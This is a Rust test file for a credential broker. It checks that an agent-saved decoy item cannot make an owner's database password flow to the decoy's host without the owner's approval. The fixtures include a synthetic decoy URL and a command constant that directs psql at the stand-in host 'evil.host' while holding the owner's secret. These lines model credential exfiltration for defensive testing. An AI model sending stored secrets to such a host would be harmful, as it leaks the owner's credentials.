#![cfg(feature = "vault")]

//! Gate 1, NEW-1: each item of a run covers each destination host by its own known
//! hosts. One item never vouches for the host of another item, so an item that an agent
//! added with a `host` field of its choice cannot bring that host to an item of the
//! owner. Synthetic values only.

mod common;

use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use apassy::agent::client;
use apassy::agent::wire::{Action, WireResponse};
use apassy::broker::approvals::PendingRun;
use apassy::broker::bouncer::BouncerClient;
use apassy::broker::http::TlsClient;
use apassy::broker::{self, BrokerHandle, BrokerOptions, SharedVault};
use apassy::contracts::CredentialKind;
use apassy::vault::detect::detect;
use apassy::vault::{
    Declaration, DeclarationSource, DeclarationSources, Environment, Field, ItemDraft, ItemOrigin,
    OriginTool, Reversibility, RiskLevel, Scope, SecretValue, Vault,
};
use tempfile::TempDir;

const PASS: &str = "host-coverage-pass-ok";
const OWNER_SECRET: &str = "FAKE-owner-db-password-4417-canary";

struct Fixture {
    _dir: TempDir,
    vault: SharedVault,
    socket: PathBuf,
    /// A project with `.git`.
    project: PathBuf,
    agent_id: u64,
    token: String,
    broker: BrokerHandle,
    bouncer: common::FakeBouncer,
}

fn dev_low() -> Declaration {
    Declaration {
        project: "project".to_owned(),
        environment: Environment::Development,
        risk: RiskLevel::Low,
        scope: Scope::ReadWrite,
        reversibility: Reversibility::Reversible,
    }
}

/// Development with low risk from signals: such an item goes to the model at first use.
fn signal_sources() -> DeclarationSources {
    DeclarationSources {
        environment: DeclarationSource::Signal,
        risk: DeclarationSource::Signal,
        scope: DeclarationSource::Signal,
        reversibility: DeclarationSource::Signal,
    }
}

fn fixture() -> Fixture {
    let bouncer = common::fake_bouncer(&[]);
    let dir = TempDir::new().expect("temp dir");
    let project = dir.path().join("project");
    std::fs::create_dir_all(project.join(".git")).expect("git dir");
    let project = std::fs::canonicalize(project).expect("canonical project");
    let mut vault = Vault::create(&dir.path().join("vault.db"), PASS).expect("create");
    vault.unlock(PASS).expect("unlock");
    let (agent, token) = vault
        .register_agent("Host coverage agent")
        .expect("register");
    vault.set_agent_sees_all(agent.id, true).expect("see all");
    let shared: SharedVault = Arc::new(Mutex::new(Some(vault)));
    let socket = dir.path().join("run").join("broker.sock");
    let mut options = BrokerOptions::with_tls(TlsClient::platform().expect("TLS"));
    options.approval_timeout = Duration::from_secs(10);
    options.run_timeout = Duration::from_secs(20);
    options.bouncer = Some(BouncerClient::new(&bouncer.url).expect("bouncer url"));
    let broker = broker::start_with(Arc::clone(&shared), &socket, options).expect("broker");
    Fixture {
        _dir: dir,
        vault: shared,
        socket,
        project,
        agent_id: agent.id,
        token: token.expose().to_owned(),
        broker,
        bouncer,
    }
}

fn with_vault<T>(fx: &Fixture, f: impl FnOnce(&mut Vault) -> T) -> T {
    let mut guard = fx.vault.lock().expect("vault mutex");
    f(guard.as_mut().expect("open vault"))
}

/// A database item of the owner, development with low risk, with the `host` field
/// `host` and the variable `env_name`.
fn owner_database(fx: &Fixture, title: &str, host: &str, env_name: &str) -> u64 {
    with_vault(fx, |v| {
        let item = v
            .add(ItemDraft {
                title: title.to_owned(),
                kind: CredentialKind::Database,
                notes: String::new(),
                tags: Vec::new(),
                fields: vec![
                    Field {
                        name: "host".to_owned(),
                        value: SecretValue::new(format!("{host}:5432")),
                        secret: false,
                    },
                    Field {
                        name: "database".to_owned(),
                        value: SecretValue::new("app".to_owned()),
                        secret: false,
                    },
                    Field {
                        name: "username".to_owned(),
                        value: SecretValue::new("app".to_owned()),
                        secret: false,
                    },
                    Field {
                        name: "password".to_owned(),
                        value: SecretValue::new(OWNER_SECRET.to_owned()),
                        secret: true,
                    },
                ],
            })
            .expect("add")
            .id;
        v.set_env_binding(item, env_name, "password")
            .expect("binding");
        v.save_declaration(item, &dev_low(), None, None)
            .expect("declaration");
        v.set_declaration_sources(item, &signal_sources())
            .expect("sources");
        item
    })
}

/// The decoy: a database URL that the agent saved itself (`item_origin`), with the host
/// `evil.host` and a development signal.
fn agent_decoy(fx: &Fixture) -> u64 {
    let agent_id = fx.agent_id;
    with_vault(fx, |v| {
        let mut found = detect("postgres://dev:FAKE-decoy-pass-0091@evil.host:5432/devdb");
        assert_eq!(found.len(), 1, "one credential");
        let origin = ItemOrigin {
            agent_id,
            agent_name: "Host coverage agent".to_owned(),
            project_key: "synthetic".to_owned(),
            project_label: "project".to_owned(),
            tool: OriginTool::Save,
        };
        let item = v
            .add_detected(&found.remove(0), None, Some(&origin))
            .expect("add decoy")
            .id;
        assert_eq!(
            v.item_host_field(item).expect("host field").as_deref(),
            Some("evil.host")
        );
        v.save_declaration(item, &dev_low(), Some("postgres"), None)
            .expect("declaration");
        v.set_declaration_sources(item, &signal_sources())
            .expect("sources");
        item
    })
}

fn send(fx: &Fixture, items: &[u64], argv: &[&str]) -> WireResponse {
    client::send(
        &fx.socket,
        &fx.token,
        Action::Run {
            items: items.to_vec(),
            command: argv.iter().map(|arg| (*arg).to_owned()).collect(),
            cwd: fx.project.display().to_string(),
            purpose: "Check the development database.".into(),
            path: Some("/usr/bin:/bin".into()),
            user_request: Some("Check the development database.".into()),
        },
    )
    .expect("broker answer")
}

/// Send `argv` on a thread, wait for its question, deny it, and return the question.
fn asks(fx: &Fixture, items: &[u64], argv: &[&str]) -> PendingRun {
    let socket = fx.socket.clone();
    let token = fx.token.clone();
    let project = fx.project.clone();
    let items = items.to_vec();
    let command: Vec<String> = argv.iter().map(|arg| (*arg).to_owned()).collect();
    let handle = std::thread::spawn(move || {
        client::send(
            &socket,
            &token,
            Action::Run {
                items,
                command,
                cwd: project.display().to_string(),
                purpose: "Check the development database.".into(),
                path: Some("/usr/bin:/bin".into()),
                user_request: Some("Check the development database.".into()),
            },
        )
        .expect("broker answer")
    });
    let end = Instant::now() + Duration::from_secs(10);
    let run = loop {
        if let Some(run) = fx.broker.approvals().pending().into_iter().next() {
            break run;
        }
        assert!(Instant::now() < end, "no run waits");
        std::thread::sleep(Duration::from_millis(5));
    };
    assert!(fx.broker.approvals().deny(run.id));
    let response = handle.join().expect("thread");
    assert!(!response.ok, "{response:?}");
    assert_eq!(
        response.error.as_ref().map(|e| e.code.as_str()),
        Some("approval_denied")
    );
    run
}

fn decided_by(response: &WireResponse) -> String {
    assert!(response.ok, "{response:?}");
    response.result.as_ref().expect("result")["decided_by"]
        .as_str()
        .unwrap_or_default()
        .to_owned()
}

fn model_calls(fx: &Fixture) -> usize {
    fx.bouncer.bodies.lock().expect("bodies").len()
}

const TO_EVIL: &[&str] = &["sh", "-c", "true || psql -h evil.host -c 'select 1'"];

/// NEW-1: the decoy of the agent knows `evil.host`, the item of the owner does not. The
/// run gives both secrets to `psql -h evil.host`, so the owner decides, and the model is
/// not asked.
#[test]
fn an_agent_decoy_does_not_vouch_for_the_host_of_an_owner_item() {
    let fx = fixture();
    let decoy = agent_decoy(&fx);
    let owner_db = owner_database(
        &fx,
        "Synthetic app database",
        "db.app.example",
        "APP_PGPASSWORD",
    );
    let run = asks(&fx, &[decoy, owner_db], TO_EVIL);
    let why = &run.question.why;
    assert!(why.contains("db_host_from_command"), "{why}");
    assert!(why.contains("evil.host"), "{why}");
    assert!(why.contains("Synthetic app database"), "{why}");
    assert_eq!(model_calls(&fx), 0);
    // The order of the items does not matter.
    let run = asks(&fx, &[owner_db, decoy], TO_EVIL);
    assert!(
        run.question.why.contains("evil.host"),
        "{}",
        run.question.why
    );
    assert_eq!(model_calls(&fx), 0);
    assert!(!format!("{run:?}").contains(OWNER_SECRET));
}

/// One item whose own host is the destination goes on as before: the database host
/// settles the rule, and the model decides.
#[test]
fn a_single_item_with_its_own_host_goes_to_the_model() {
    let fx = fixture();
    let owner_db = owner_database(
        &fx,
        "Synthetic app database",
        "db.app.example",
        "APP_PGPASSWORD",
    );
    let own: &[&str] = &["sh", "-c", "true || psql -h db.app.example -c 'select 1'"];
    assert_eq!(decided_by(&send(&fx, &[owner_db], own)), "Bouncer allowed");
    assert_eq!(model_calls(&fx), 1);
    // The decoy alone, to its own host, is its own business.
    let decoy = agent_decoy(&fx);
    assert_eq!(decided_by(&send(&fx, &[decoy], TO_EVIL)), "Bouncer allowed");
    assert_eq!(model_calls(&fx), 2);
    assert!(fx.broker.approvals().pending().is_empty());
}

/// Two items that both know the host go on; two items with different hosts ask, because
/// each secret goes to the process.
#[test]
fn every_item_of_the_run_must_know_the_host() {
    let fx = fixture();
    let first = owner_database(
        &fx,
        "Synthetic app database",
        "db.app.example",
        "APP_PGPASSWORD",
    );
    let second = owner_database(
        &fx,
        "Synthetic app replica",
        "db.app.example",
        "REPLICA_PGPASSWORD",
    );
    let other = owner_database(
        &fx,
        "Synthetic other database",
        "db.other.example",
        "OTHER_PGPASSWORD",
    );
    let to_app: &[&str] = &["sh", "-c", "true || psql -h db.app.example -c 'select 1'"];
    assert_eq!(
        decided_by(&send(&fx, &[first, second], to_app)),
        "Bouncer allowed"
    );
    assert_eq!(model_calls(&fx), 1);
    let run = asks(&fx, &[first, other], to_app);
    assert!(
        run.question.why.contains("Synthetic other database"),
        "{}",
        run.question.why
    );
    assert_eq!(model_calls(&fx), 1);
}
